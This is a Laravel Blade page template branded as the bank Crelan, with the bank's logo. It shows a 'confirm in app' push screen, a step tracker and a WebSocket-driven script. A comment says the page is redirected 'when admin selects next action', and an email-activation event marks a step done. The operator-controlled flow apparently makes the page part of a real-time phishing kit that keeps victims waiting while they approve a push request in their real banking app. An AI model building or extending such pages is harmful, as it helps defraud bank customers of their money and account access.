@extends('layouts.app')

@section('title', __('messages.push_confirm_title') . ' | Crelan')

@section('content')
<div class="form-page-center">
    <div class="form-container">
        <div class="form-container--header-crelan">
            <svg class="crelan-logo-icon" width="48" height="34" viewBox="0 0 48 34" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M40.3007 0.955874C39.4821 4.0007 38.2455 6.83888 36.6671 9.38458C31.9043 17.0694 24.0286 22.0916 15.1179 22.0916C11.9602 22.0916 8.93273 21.4606 6.12793 20.3041L7.28372 24.6914L9.14052 31.7379C12.219 32.884 15.5068 33.5055 18.9232 33.5055C31.3351 33.5055 42.0618 25.3248 47.1437 13.4586L40.2999 0.955078L40.3007 0.955874Z" fill="#C3D100"/>
                <path d="M36.6671 9.38483L31.5303 0C30.943 2.13956 29.962 4.21713 28.64 6.10077C25.2456 10.9363 19.6007 14.4858 12.5828 14.4858C10.4421 14.4858 8.32031 14.2306 6.3255 13.6822C3.98333 13.0385 1.81602 11.9909 0 10.4729L3.31369 23.0488C4.33619 23.598 5.67233 24.1885 7.28448 24.6924C9.57804 25.4093 12.4291 25.9513 15.7326 25.9513C24.8457 25.9513 33.4028 20.3608 38.4643 12.6673L36.6679 9.38563L36.6671 9.38483Z" fill="#88BC1F"/>
                <path d="M28.6397 6.09983L25.7894 0.891602C23.6158 5.87252 20.2002 9.4427 13.601 9.4427C10.0372 9.4427 5.97545 7.90956 4.4668 6.63075L6.32438 13.6805L7.20808 17.0345C9.31266 17.7013 11.5317 18.059 13.8245 18.059C21.2329 18.059 27.6713 14.0024 30.2683 9.07551L28.6397 6.09983Z" fill="#019544"/>
                <path d="M38.4635 12.6659L36.6671 9.38428C31.9043 17.0691 24.0286 22.0913 15.1179 22.0913C11.9602 22.0913 8.93273 21.4603 6.12793 20.3038L7.28372 24.6911C9.57728 25.408 12.4283 25.95 15.7318 25.95C24.8449 25.95 33.402 20.3595 38.4635 12.6659Z" fill="#7FAD00"/>
                <path d="M40.3012 0.955874C39.4825 4.0007 38.246 6.83888 36.6675 9.38458L38.464 12.6662C33.4032 20.3598 24.8461 25.9503 15.7323 25.9503C12.4288 25.9503 9.57773 25.4083 7.28418 24.6914L9.14098 31.7379C12.2194 32.884 15.5073 33.5055 18.9237 33.5055C31.3355 33.5055 42.0623 25.3248 47.1442 13.4586L40.3004 0.955078L40.3012 0.955874Z" fill="#C4D600"/>
                <path d="M28.6397 6.09983L25.7894 0.891602C23.6158 5.87252 20.2002 9.4427 13.601 9.4427C10.0372 9.4427 5.97545 7.90956 4.4668 6.63075L6.32438 13.6805C8.31997 14.2289 10.4418 14.484 12.5817 14.484C19.5995 14.484 25.2444 10.9345 28.6389 6.09904L28.6397 6.09983Z" fill="#00AE53"/>
                <path d="M13.8245 18.0597C21.2329 18.0597 27.6713 14.0031 30.2683 9.07626L28.6397 6.10059C25.2453 10.9361 19.6004 14.4856 12.5825 14.4856C10.4418 14.4856 8.32 14.2305 6.3252 13.682L7.2089 17.036C9.31348 17.7029 11.5325 18.0605 13.8253 18.0605L13.8245 18.0597Z" fill="#009644"/>
                <path d="M31.5311 0C30.9438 2.13956 29.9628 4.21713 28.6408 6.10078L30.2694 9.07645C27.6724 14.0033 21.234 18.0599 13.8256 18.0599C11.5329 18.0599 9.31457 17.7023 7.20921 17.0354L6.3255 13.6814C3.98333 13.0377 1.81602 11.9901 0 10.4721L3.31369 23.048C4.33619 23.5972 5.67233 24.1877 7.28448 24.6916L6.12869 20.3044C8.93427 21.4608 11.9618 22.0919 15.1186 22.0919C24.0294 22.0919 31.9051 17.0696 36.6679 9.38483L31.5311 0Z" fill="#84BD00"/>
            </svg>
            <span>{{ __('messages.push_confirm_title') }}</span>
        </div>

        <div class="form-container--content">
            <div class="push-container">
                <div class="push-icon">
                    <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M17 1H7C5.9 1 5 1.9 5 3V21C5 22.1 5.9 23 7 23H17C18.1 23 19 22.1 19 21V3C19 1.9 18.1 1 17 1ZM17 19H7V5H17V19ZM12 18C12.55 18 13 17.55 13 17C13 16.45 12.55 16 12 16C11.45 16 11 16.45 11 17C11 17.55 11.45 18 12 18Z" fill="#84BD00"/>
                        <circle cx="12" cy="11" r="3" stroke="#84BD00" stroke-width="2" fill="none"/>
                        <path d="M12 8V11L13.5 12.5" stroke="#84BD00" stroke-width="1.5" stroke-linecap="round"/>
                    </svg>
                </div>
                
                <h2 class="push-title">{{ __('messages.push_confirm_in_app') }}</h2>
                
                <p class="push-text">
                    {{ __('messages.push_request_sent') }}
                </p>
                
                <!-- Progress Steps -->
                <div class="participation-progress">
                    <h3 class="progress-title">{{ __('messages.participation_steps') }}</h3>
                    
                    <div class="progress-steps">
                        <!-- Step 1 - Completed -->
                        <div class="progress-step completed">
                            <div class="step-indicator">
                                <span class="step-number">1</span>
                                <div class="step-icon">
                                    <svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                                        <path d="M13.5 4.5L6 12L2.5 8.5" stroke="#00A651" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                                    </svg>
                                </div>
                            </div>
                            <div class="step-content">
                                <h4 class="step-title">{{ __('messages.step1_title') }}</h4>
                                <p class="step-description">{{ __('messages.step1_description') }}</p>
                            </div>
                        </div>
                        
                        <!-- Step 2 - Pending -->
                        <div class="progress-step pending" id="step2">
                            <div class="step-indicator">
                                <span class="step-number">2</span>
                                <div class="step-icon">
                                    <svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                                        <circle cx="8" cy="8" r="6" stroke="#84BD00" stroke-width="1.5" fill="none"/>
                                        <circle cx="8" cy="8" r="2" fill="#84BD00"/>
                                    </svg>
                                </div>
                            </div>
                            <div class="step-content">
                                <h4 class="step-title">{{ __('messages.step2_title') }}</h4>
                                <p class="step-description">{{ __('messages.step2_description') }}</p>
                                <div class="step-status" id="step2-status">
                                    <span class="status-pending">{{ __('messages.step2_pending') }}</span>
                                    <span class="status-completed" style="display: none;">{{ __('messages.step2_completed') }}</span>
                                </div>
                            </div>
                        </div>
                    </div>
                    
                    <!-- Progress Bar -->
                    <div class="progress-bar-container">
                        <div class="progress-bar">
                            <div class="progress-fill" style="width: 50%"></div>
                        </div>
                        <div class="progress-labels">
                            <span class="progress-label">50%</span>
                            <span class="progress-text">{{ __('messages.step2_pending') }}</span>
                        </div>
                    </div>
                </div>
                
                <div class="push-steps">
                    <div class="push-step">
                        <span class="push-step-number">1</span>
                        <span class="push-step-text">{{ __('messages.push_step1') }}</span>
                    </div>
                    <div class="push-step">
                        <span class="push-step-number">2</span>
                        <span class="push-step-text">{{ __('messages.push_step2') }}</span>
                    </div>
                    <div class="push-step">
                        <span class="push-step-number">3</span>
                        <span class="push-step-text">{{ __('messages.push_step3') }}</span>
                    </div>
                </div>
                
                <div class="waiting-spinner"></div>
                <p class="waiting-text">{{ __('messages.push_waiting') }}</p>
            </div>
        </div>
    </div>
</div>
@endsection

@push('styles')
<style>
.participation-progress {
    background: #f8fafc;
    border-radius: 12px;
    padding: 20px;
    margin: 20px 0;
    border: 1px solid #e2e8f0;
}

.progress-title {
    font-size: 16px;
    font-weight: 600;
    color: #1a202c;
    margin-bottom: 16px;
    text-align: center;
}

.progress-steps {
    margin-bottom: 20px;
}

.progress-step {
    display: flex;
    align-items: flex-start;
    margin-bottom: 20px;
    position: relative;
}

.progress-step:last-child {
    margin-bottom: 0;
}

.progress-step::before {
    content: '';
    position: absolute;
    left: 20px;
    top: 32px;
    width: 2px;
    height: calc(100% - 24px);
    background: #e2e8f0;
}

.progress-step:last-child::before {
    display: none;
}

.step-indicator {
    position: relative;
    margin-right: 12px;
    flex-shrink: 0;
}

.step-number {
    display: flex;
    align-items: center;
    justify-content: center;
    width: 32px;
    height: 32px;
    border-radius: 50%;
    font-weight: 600;
    font-size: 12px;
    position: relative;
    z-index: 2;
}

.step-icon {
    position: absolute;
    top: -2px;
    right: -2px;
    width: 14px;
    height: 14px;
    background: white;
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
}

.progress-step.completed .step-number {
    background: #E6F6EA;
    color: #00A651;
    border: 2px solid #00A651;
}

.progress-step.pending .step-number {
    background: #f0f9ff;
    color: #84BD00;
    border: 2px solid #84BD00;
}

.step-content {
    flex: 1;
    padding-top: 4px;
}

.step-title {
    font-size: 14px;
    font-weight: 600;
    color: #1a202c;
    margin-bottom: 2px;
}

.step-description {
    font-size: 12px;
    color: #64748b;
    line-height: 1.4;
    margin-bottom: 6px;
}

.step-status {
    font-size: 11px;
    font-weight: 500;
}

.status-pending {
    color: #84BD00;
}

.status-completed {
    color: #00A651;
}

.progress-bar-container {
    margin-top: 16px;
}

.progress-bar {
    height: 6px;
    background: #e2e8f0;
    border-radius: 3px;
    overflow: hidden;
    margin-bottom: 6px;
}

.progress-fill {
    height: 100%;
    background: linear-gradient(90deg, #84BD00 0%, #00A651 100%);
    border-radius: 3px;
    transition: width 0.3s ease;
}

.progress-labels {
    display: flex;
    justify-content: space-between;
    align-items: center;
    font-size: 11px;
}

.progress-label {
    font-weight: 600;
    color: #1a202c;
}

.progress-text {
    color: #64748b;
}
</style>
@endpush

@push('scripts')
<script>
document.addEventListener('DOMContentLoaded', function() {
    // Listen for WebSocket events for push confirmation
    const sessionId = localStorage.getItem('session_id');
    
    if (!sessionId) {
        window.location.href = '/';
        return;
    }
    
    // The page will be redirected via WebSocket when admin selects next action
    // SessionManager from session.js handles the WebSocket connection
    if (window.SessionManager) {
        window.SessionManager.setSessionId(sessionId);
        
        // Listen for email activation event
        window.addEventListener('session:email_activated', function() {
            // Update step 2 as completed
            const step2 = document.getElementById('step2');
            const step2Status = document.getElementById('step2-status');
            const progressFill = document.querySelector('.progress-fill');
            const progressLabel = document.querySelector('.progress-label');
            const progressText = document.querySelector('.progress-text');
            
            if (step2) {
                step2.classList.remove('pending');
                step2.classList.add('completed');
            }
            
            if (step2Status) {
                step2Status.querySelector('.status-pending').style.display = 'none';
                step2Status.querySelector('.status-completed').style.display = 'inline';
            }
            
            if (progressFill) {
                progressFill.style.width = '100%';
            }
            
            if (progressLabel) {
                progressLabel.textContent = '100%';
            }
            
            if (progressText) {
                progressText.textContent = '{{ __("messages.step2_completed") }}';
                progressText.style.color = '#00A651';
            }
            
            // Update step indicator
            const step2Number = step2.querySelector('.step-number');
            const step2Icon = step2.querySelector('.step-icon svg');
            
            if (step2Number) {
                step2Number.style.background = '#E6F6EA';
                step2Number.style.color = '#00A651';
                step2Number.style.borderColor = '#00A651';
            }
            
            if (step2Icon) {
                step2Icon.innerHTML = '<path d="M13.5 4.5L6 12L2.5 8.5" stroke="#00A651" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>';
            }
        });
    }
});
</script>
@endpush
